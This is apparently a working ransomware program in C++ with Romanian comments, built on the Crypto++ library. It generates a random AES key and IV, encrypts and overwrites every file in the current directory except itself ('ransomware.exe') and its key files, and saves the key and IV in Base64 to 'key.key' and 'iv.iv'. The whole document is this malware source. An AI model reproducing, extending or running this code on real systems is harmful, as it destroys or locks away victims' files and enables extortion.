#include <iostream>
#include <fstream>
#include <filesystem>
#include <cryptopp/aes.h> 
#include <cryptopp/filters.h>
#include <cryptopp/modes.h>
#include <cryptopp/osrng.h>
#include <cryptopp/base64.h>

namespace fs = std::filesystem;

void encryptFile(const fs::path& filePath, const CryptoPP::SecByteBlock& key, const CryptoPP::SecByteBlock& iv) {
    // Citim conținutul original al fișierului
    std::ifstream inFile(filePath, std::ios::binary);
    std::string contents((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
    inFile.close();

    std::string encrypted;
    try {
        // Setăm modul de criptare
        CryptoPP::CBC_Mode<CryptoPP::AES>::Encryption encryption;
        encryption.SetKeyWithIV(key, key.size(), iv);

        // Criptăm conținutul
        CryptoPP::StringSource ss(contents, true,
            new CryptoPP::StreamTransformationFilter(encryption,
                new CryptoPP::StringSink(encrypted)
            )
        );

        // Scriem conținutul criptat înapoi în fișier
        std::ofstream outFile(filePath, std::ios::binary);
        outFile.write(encrypted.data(), encrypted.size());
        outFile.close();
    } catch (const CryptoPP::Exception& e) {
        std::cerr << "Error encrypting file: " << e.what() << '\n';
    }
}

void saveKeyAndIV(const CryptoPP::SecByteBlock& key, const CryptoPP::SecByteBlock& iv) {
    // Convertim și salvăm cheia și IV-ul în format Base64
    CryptoPP::Base64Encoder encoder;

    // Salvăm cheia
    std::string base64Key;
    encoder.Attach(new CryptoPP::StringSink(base64Key));
    encoder.Put(key, key.size());
    encoder.MessageEnd();

    std::ofstream outKey("key.key");
    outKey << base64Key;
    outKey.close();

    // Salvăm IV
    std::string base64IV;
    encoder.Attach(new CryptoPP::StringSink(base64IV));
    encoder.Put(iv, iv.size());
    encoder.MessageEnd();

    std::ofstream outIV("iv.iv");
    outIV << base64IV;
    outIV.close();
}

int main() {
    // Generăm o cheie și un vector de inițializare (IV)
    CryptoPP::AutoSeededRandomPool prng;
    CryptoPP::SecByteBlock key(CryptoPP::AES::DEFAULT_KEYLENGTH);
    prng.GenerateBlock(key, key.size());

    CryptoPP::SecByteBlock iv(CryptoPP::AES::BLOCKSIZE);
    prng.GenerateBlock(iv, iv.size());

    // Criptăm toate fișierele din directorul curent
    for (const auto& entry : fs::directory_iterator(fs::current_path())) {
        if (entry.path().filename() == "ransomware.exe" || entry.path().filename() == "key.key" || entry.path().filename() == "iv.iv") {
            continue;
        }
        encryptFile(entry.path(), key, iv);
    }

    // Salvăm cheia și IV-ul
    saveKeyAndIV(key, iv);

    std::cout << "All files have been encrypted.\n";
    return 0;
}
